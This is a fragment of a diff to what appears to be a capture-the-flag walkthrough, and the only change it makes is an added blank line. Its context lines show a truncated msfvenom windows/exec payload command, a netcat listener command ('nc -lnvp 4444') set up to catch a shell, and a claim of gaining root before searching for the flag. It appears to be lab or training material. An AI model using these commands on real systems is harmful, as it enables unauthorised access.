@@ -50,4 +50,5 @@ The metasploit payload : `msfvenom -p windows/exec  CMD=’c;\xampp\htdocs\gym\u
 *Now start a netcat listner as nc -lnvp 4444 and on the second terminal exeute the payload as follows :*
 
 ![](13.png)
+
  *we got the root privilege in the system Now lets find the root flag .*
